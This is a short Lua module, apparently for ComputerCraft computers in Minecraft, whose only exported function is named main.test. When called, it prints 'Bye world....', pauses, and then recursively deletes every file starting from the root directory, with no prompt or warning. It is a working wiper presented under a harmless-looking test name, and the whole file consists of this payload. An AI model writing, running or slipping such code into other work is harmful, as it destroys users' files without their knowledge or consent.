local main = {}

local function reccursive_delete(path)
    local list = fs.list(path)
    for k,v in pairs(list) do
        local p = fs.combine(path,v)
        if fs.isDir(p) then
            reccursive_delete(p)
        else
            fs.delete(p)
        end
    end
end

function main.test()
    textutils.slowPrint("Bye world....")
    sleep(0.5)
    reccursive_delete("/")
end

return main
